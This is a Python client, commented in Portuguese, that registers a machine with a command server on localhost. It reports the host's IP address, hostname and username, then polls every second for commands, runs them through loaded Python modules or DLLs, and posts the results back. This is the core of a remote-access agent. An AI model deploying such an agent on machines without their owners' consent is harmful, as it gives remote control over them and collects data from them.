import os
import requests
import time
import socket
import platform
import getpass
import ctypes
import pkgutil
import importlib
from pathlib import Path
from plyer import notification
from requests.exceptions import RequestException

# Configurações do servidor
SERVER_URL = "http://localhost:4000/api/v1"
COMMANDS_DIR = "commands"
DLL_DIR = "dll_commands"
LOADED_COMMANDS = {}
LAST_CODE = None

def get_system_info():
    """
    Recupera informações básicas do sistema e usuário.
    """
    return {
        "ipAddress": socket.gethostbyname(socket.gethostname()),
        "hostname": socket.gethostname(),
        "username": getpass.getuser(),
        "operatingSystem": platform.system(),
        "architecture": platform.machine()
    }

def register_agent():
    """
    Registra o Agent no servidor se ainda não estiver registrado.
    """
    info = get_system_info()
    try:
        response = requests.get(f"{SERVER_URL}/check-agent/{info['hostname']}")
        if response.status_code == 200:
            print("Agent já registrado.")
        else:
            response_post = requests.post(f"{SERVER_URL}/create-agent", json=info)
            if response_post.status_code == 201:
                print("Agent registrado com sucesso.")
            else:
                print(f"Falha ao registrar Agent: {response_post.text}")
    except RequestException as e:
        print(f"Erro ao registrar Agent: {e}")

def update_activity():
    """
    Atualiza a última atividade do Agent no servidor.
    """
    try:
        hostname = get_system_info()["hostname"]
        response = requests.post(f"{SERVER_URL}/activity/{hostname}")
        if response.status_code == 200:
            print("Atividade atualizada.")
        else:
            print(f"Falha ao atualizar atividade: {response.text}")
    except RequestException as e:
        print(f"Erro ao atualizar atividade: {e}")

def load_commands():
    """
    Carrega todos os comandos da pasta `commands/`.
    Cada comando deve ter: name (str) e run(args: list) -> str
    """
    global LOADED_COMMANDS
    LOADED_COMMANDS.clear()

    package = COMMANDS_DIR.replace("/", ".")
    package_path = Path(COMMANDS_DIR)

    if not package_path.exists():
        package_path.mkdir()

    for _, module_name, _ in pkgutil.iter_modules([str(package_path)]):
        try:
            module = importlib.import_module(f"{package}.{module_name}")
            if hasattr(module, "name") and hasattr(module, "run"):
                LOADED_COMMANDS[module.name] = module
                print(f"[INFO] Comando carregado: {module.name}")
        except Exception as e:
            print(f"[ERRO] Falha ao carregar comando {module_name}: {e}")

def load_dll_commands():
    """Carrega funções das DLLs na pasta `dll_commands/`."""
    dll_path = Path(DLL_DIR)
    if not dll_path.exists():
        dll_path.mkdir()
    for dll_file in dll_path.glob("*.dll"):
        try:
            lib = ctypes.CDLL(str(dll_file))
            LOADED_COMMANDS[dll_file.stem.lower()] = lib
            print(f"[INFO] DLL carregada: {dll_file.name}")
        except Exception as e:
            print(f"[ERRO] Falha ao carregar DLL {dll_file.name}: {e}")

def send_returned(result: str):
    """
    Envia resultado de comando (returned) para o servidor.
    """
    try:
        hostname = get_system_info()["hostname"]
        data = {"returned": result}
        response = requests.post(f"{SERVER_URL}/returned/{hostname}", json=data)
        if response.status_code == 200:
            print("Returned enviado com sucesso.")
        else:
            print(f"Falha ao enviar returned: {response.text}")
    except RequestException as e:
        print(f"Erro ao enviar returned: {e}")

def execute_command(command: str) -> str:
    """
    Executa um comando dinâmico baseado na pasta commands.
    """
    parts = command.split(" ")
    cmd = parts[0].lower()
    args = parts[1:]

    if cmd in LOADED_COMMANDS:
        obj = LOADED_COMMANDS[cmd]
        # Se for módulo Python
        if hasattr(obj, "run"):
            try:
                return obj.run(args)
            except Exception as e:
                return f"[ERRO] Falha ao executar {cmd}: {e}"

    # Depois verifica se é uma DLL carregada
    dll_path = os.path.join("dll_commands", f"{cmd}.dll")
    if os.path.exists(dll_path):
        try:
            dll = ctypes.CDLL(dll_path)
            if hasattr(dll, "run"):
                # Para funções void, ctypes retorna None, então podemos retornar sucesso
                result = dll.run()
                return f"[INFO] DLL {cmd} executada com sucesso."
            else:
                return f"[INFO] DLL {cmd} carregada, sem função 'run'."
        except Exception as e:
            return f"[ERRO] Falha ao executar DLL {cmd}: {e}"
        
    return "[ERRO] Comando não reconhecido."

def check_for_command():
    global LAST_CODE
    try:
        hostname = get_system_info()["hostname"]
        # Pega o último código do Agent
        new = requests.get(f'{SERVER_URL}/last-code/{hostname}').json()
        command_data = requests.get(f'{SERVER_URL}/command/{hostname}').json()

        # Se o código mudou, é um comando novo
        if new['code'] != LAST_CODE:
            LAST_CODE = new['code']
            command = command_data.get('command')
            print(f'Executando comando: {command}')
            
            # Executa o comando
            result = execute_command(command)
            
            # Envia o resultado
            send_returned(result)

            # Marca o comando como executado
            teste = requests.post(f'{SERVER_URL}/command-executed/{hostname}')

    except Exception as e:
        print(f"Erro ao checar comando: {e}")

def main_loop():
    """
    Loop principal do Agent.
    """
    register_agent()
    load_dll_commands()
    load_commands()
    while True:
        update_activity()
        check_for_command()
        time.sleep(1)

if __name__ == "__main__":
    main_loop()
